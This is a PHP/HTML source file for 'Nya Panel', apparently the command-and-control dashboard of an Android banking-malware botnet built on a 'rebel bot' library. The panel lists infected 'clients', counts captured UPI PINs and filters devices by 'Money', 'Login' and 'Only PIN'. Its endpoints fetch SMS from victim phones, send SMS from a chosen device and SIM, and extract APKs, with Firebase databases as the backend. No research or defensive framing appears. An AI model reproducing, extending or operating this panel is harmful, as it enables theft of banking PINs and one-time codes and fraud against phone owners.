<?php
require_once __DIR__ . '/rebel_bot_lib.php';

if (isset($_GET['rebel_firebase_api']) || isset($_POST['rebel_firebase_api'])) {
  rebel_firebase_api_handle(false);
}
$serverProjects = rebel_firebase_list();

if (isset($_GET['rebel_send_sms']) || isset($_POST['rebel_send_sms'])) {
  $body = json_decode(file_get_contents('php://input') ?: '{}', true);
  if (!is_array($body)) $body = [];
  $result = rebel_send_sms_to_device(
    rtrim(trim((string)($body['database_url'] ?? '')), '/'),
    trim((string)($body['auth_key'] ?? '')),
    trim((string)($body['device_id'] ?? '')),
    max(1, (int)($body['sim'] ?? 1)),
    trim((string)($body['to'] ?? '')),
    trim((string)($body['message'] ?? '')),
    strtolower(trim((string)($body['schema'] ?? 'rabel'))),
    trim((string)($body['device_node'] ?? 'clients'))
  );
  rebel_json_out($result, !empty($result['ok']) ? 200 : 502);
}

if (isset($_GET['rebel_fetch_sms']) || isset($_POST['rebel_fetch_sms'])) {
  $body = json_decode(file_get_contents('php://input') ?: '{}', true);
  if (!is_array($body)) $body = [];
  $result = rebel_fetch_sms_for_device(
    rtrim(trim((string)($body['database_url'] ?? '')), '/'),
    trim((string)($body['auth_key'] ?? '')),
    trim((string)($body['device_id'] ?? '')),
    strtolower(trim((string)($body['schema'] ?? 'rabel'))),
    trim((string)($body['device_node'] ?? 'clients')),
    trim((string)($body['composite_id'] ?? ''))
  );
  rebel_json_out($result, !empty($result['ok']) ? 200 : 502);
}

if (isset($_GET['rebel_apk_extract']) || isset($_POST['rebel_apk_extract'])) {
  rebel_apk_extract_api_handle();
}

header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no"/>
<meta name="theme-color" content="#adcf9f"/>
<title>BrM — Nya Panel</title>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
<style>
:root{
  --main:#adcf9f;--card:#d2edc6;--card-border:#546b4d;
  --black:#000;--pin:#9c27b0;--offline:#f00;--online:#005509;
  --muted:#454545;--hint:#888;
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{
  height:100%;height:100dvh;width:100%;
  font-family:sans-serif;background:var(--main);color:var(--black);
  overflow:hidden;position:fixed;inset:0;
}
.hidden{display:none!important}
.app{
  height:100%;height:100dvh;width:100%;
  display:flex;flex-direction:column;
  background:var(--main);overflow:hidden;
}
.panel-view{
  display:flex;flex-direction:column;
  flex:1;min-height:0;width:100%;
  overflow:hidden;
}

/* Header block — APK activity_main / onlypin */
.hdr-block{background:var(--main);padding:12px 0 0;flex-shrink:0;position:relative}
.hdr-row{display:flex;align-items:center;justify-content:space-between;padding:0 16px 8px}
.hdr-title{font-size:20px;font-weight:800;text-align:center;flex:1}
.hdr-title.big{font-size:25px;text-align:left;padding-left:16px}
.icon-btn{background:none;border:none;width:40px;height:40px;cursor:pointer;font-size:22px;display:flex;align-items:center;justify-content:center}
.upi-line{font-size:20px;font-weight:800;padding:0 16px 8px}
.btn-row{display:flex;gap:8px;padding:8px;margin:0 8px}
.btn-row .nya-btn{flex:1;height:44px;border:1px solid var(--black);border-radius:10px;background:var(--black);color:var(--main);font-size:12px;font-weight:700;cursor:pointer}
.btn-row .nya-btn.active{outline:3px solid var(--black);outline-offset:2px}
.btn-row .nya-btn.wide{font-size:14px}
.search-row{display:flex;align-items:center;padding:0 16px 16px;gap:8px}
.search-box{flex:1;height:45px;border-radius:20px;border:1px solid var(--card);background:var(--card);padding:0 14px;font-size:16px;color:var(--black);outline:none}
.search-box::placeholder{color:var(--hint)}

/* Device list — scrollable area */
.list-wrap{
  flex:1;min-height:0;width:100%;
  overflow-y:auto;overflow-x:hidden;
  -webkit-overflow-scrolling:touch;
  overscroll-behavior:contain;
  touch-action:pan-y;
  padding-bottom:max(20px,env(safe-area-inset-bottom));
}

/* card_list.xml exact */
.dev-card{margin:5px 15px;border-radius:20px;background:var(--card-border);box-shadow:0 8px 24px rgba(0,0,0,.25);overflow:hidden;cursor:pointer}
.dev-card-inner{background:var(--card);min-height:150px;padding:8px 12px;display:grid;grid-template-columns:60px 1fr auto;grid-template-rows:auto auto auto;gap:4px 10px;position:relative}
.dev-count{font-size:15px;font-weight:800;grid-column:1;grid-row:1;align-self:start;margin-top:8px}
.dev-like{width:60px;height:60px;grid-column:1;grid-row:2;display:flex;align-items:center;justify-content:center;font-size:36px}
.dev-like.liked{color:#e91e63}
.dev-info{grid-column:2;grid-row:1/3;font-size:16px;font-weight:700;line-height:1.45;white-space:pre-line;padding-top:8px}
.dev-status{grid-column:3;grid-row:1;font-size:20px;font-weight:800;text-shadow:1px 1px 2px rgba(0,0,0,.3)}
.dev-status.offline{color:var(--offline)}
.dev-status.online{color:var(--online)}
.dev-del{grid-column:3;grid-row:2;font-size:24px;cursor:pointer;padding:4px;align-self:center}
.dev-pin{grid-column:1/3;grid-row:3;font-size:18px;font-weight:800;color:var(--pin);text-shadow:1px 1px 2px rgba(0,0,0,.2)}
.dev-check{grid-column:3;grid-row:3;font-size:14px;font-weight:800;color:var(--pin);display:flex;align-items:center;gap:4px}
.dev-check input{width:18px;height:18px;accent-color:var(--pin)}
.dev-time{grid-column:2/4;grid-row:4;font-size:12px;font-weight:700;color:var(--muted);text-align:right;padding-top:2px}

.empty{padding:40px 20px;text-align:center;font-weight:700;color:var(--muted)}
.loading-overlay{position:fixed;inset:0;background:rgba(255,255,255,.5);display:none;align-items:center;justify-content:center;z-index:100}
.loading-overlay.show{display:flex}
.spinner{width:60px;height:60px;border:5px solid var(--card-border);border-top-color:var(--black);border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}

/* Firebase sheet */
.sheet-bg{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:50;opacity:0;pointer-events:none;transition:.2s}
.sheet-bg.open{opacity:1;pointer-events:auto}
.sheet{position:fixed;left:0;right:0;bottom:0;z-index:51;background:var(--card);border-radius:20px 20px 0 0;padding:16px;max-height:75vh;overflow-y:auto;transform:translateY(100%);transition:.28s}
.sheet.open{transform:translateY(0)}
.sheet h3{font-size:16px;margin-bottom:12px}
.fb-item{padding:12px;border:1px solid var(--card-border);border-radius:12px;margin-bottom:8px;background:#fff;cursor:pointer}
.fb-item.active{border-color:var(--black);background:var(--main)}
.fb-item small{display:block;color:var(--muted);font-size:11px;margin-top:4px;word-break:break-all}
.sheet input{width:100%;padding:12px;margin:6px 0;border-radius:12px;border:1px solid var(--card-border);font-size:14px}
.sheet .nya-btn{width:100%;margin-top:8px;height:44px}

/* SMS modal */
.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:60;display:none;align-items:flex-end;justify-content:center}
.modal-bg.open{display:flex}
.modal{width:100%;max-height:85vh;background:var(--main);border-radius:20px 20px 0 0;padding:16px;display:flex;flex-direction:column;overflow:hidden}
#smsModalList{flex:1;min-height:0;overflow-y:auto;-webkit-overflow-scrolling:touch;overscroll-behavior:contain;touch-action:pan-y;padding-bottom:12px}
.sms-card{margin:4px 5px;border-radius:20px;background:var(--card-border);box-shadow:0 4px 16px rgba(0,0,0,.15)}
.sms-inner{background:var(--card);padding:10px 16px;display:flex;gap:10px;align-items:flex-start}
.sms-icon{font-size:40px;flex-shrink:0}
.sms-body{flex:1;font-size:14px;color:var(--black);word-break:break-word}
.sms-meta{font-size:12px;font-weight:700;color:var(--muted);margin-top:6px}

.toast-wrap{position:fixed;top:12px;left:12px;right:12px;z-index:200;pointer-events:none}
.toast{padding:12px;border-radius:12px;background:#fff;border:1px solid var(--card-border);font-size:13px;margin-bottom:8px;box-shadow:0 4px 12px rgba(0,0,0,.15)}
</style>
</head>
<body>
<div class="app">

  <!-- HOME — activity_main.xml -->
  <div id="view-home" class="panel-view">
    <div class="hdr-block">
      <div class="hdr-row">
        <span style="width:40px"></span>
        <div class="hdr-title" id="totalClients">Total Clients:-</div>
        <button class="icon-btn" onclick="openFbSheet()" title="Firebase">🔥</button>
      </div>
      <div class="btn-row">
        <button class="nya-btn" id="btnLiked" onclick="setFilter('liked',this)">Liked ❤️</button>
        <button class="nya-btn" id="btnOnline" onclick="setFilter('online',this)">Online🟢</button>
        <button class="nya-btn" id="btnOnlyPin" onclick="goOnlyPin()">Only PIN📍</button>
      </div>
      <div class="search-row">
        <input class="search-box" id="searchHome" placeholder="Search clients..." oninput="renderDevices()"/>
        <button class="icon-btn" onclick="refreshData()">🔄</button>
      </div>
      <div class="btn-row">
        <button class="nya-btn wide" onclick="setFilter('money',this)">Money 💰</button>
        <button class="nya-btn" onclick="setFilter('login',this)">Login👨🏻‍💻</button>
        <button class="nya-btn" onclick="deleteChecked()">Delete🗑️</button>
      </div>
    </div>
    <div class="list-wrap" id="devList"></div>
  </div>

  <!-- ONLY PIN — onlypin.xml -->
  <div id="view-onlypin" class="panel-view hidden">
    <div class="hdr-block" style="min-height:180px">
      <div class="hdr-row">
        <button class="nya-btn wide" style="width:150px;height:40px;margin-left:8px" onclick="goHome()">Home 🏡</button>
        <span style="flex:1"></span>
        <button class="icon-btn" onclick="refreshData()">🔄</button>
      </div>
      <div class="hdr-title big" id="panelTitle">Android Management XYZ</div>
      <div class="upi-line" id="upiPinCount">UPI PIN:-</div>
      <div class="search-row">
        <input class="search-box" id="searchPin" placeholder="Search Only Pin clients..." oninput="renderDevices()"/>
        <button class="icon-btn" onclick="renderDevices()">🔍</button>
      </div>
    </div>
    <div class="list-wrap" id="devListPin"></div>
  </div>

</div>

<div class="loading-overlay" id="loading"><div class="spinner"></div></div>
<div class="toast-wrap" id="toasts"></div>

<div class="sheet-bg" id="sheetBg" onclick="closeFbSheet()"></div>
<div class="sheet" id="fbSheet">
  <h3>🔥 Firebase Projects</h3>
  <div id="fbSheetList"></div>
  <input id="fbAddName" placeholder="Project name"/>
  <input id="fbAddUrl" placeholder="https://xxx.firebaseio.com"/>
  <input id="fbAddApiKey" placeholder="API key (optional)"/>
  <button class="nya-btn wide" type="button" onclick="addFirebaseProject()">+ Add Firebase</button>
</div>

<div class="modal-bg" id="smsModal" onclick="closeSmsModal(event)">
  <div class="modal" onclick="event.stopPropagation()">
    <div class="hdr-row"><strong id="smsModalTitle">SMS</strong><button class="icon-btn" onclick="closeSmsModal()">✕</button></div>
    <div id="smsModalList"></div>
  </div>
</div>

<script>var SERVER_FIREBASES=<?php echo json_encode(array_values($serverProjects), JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;</script>
<script src="firebase_defaults.js"></script>
<script src="nya-firebase.js"></script>
</body>
</html>
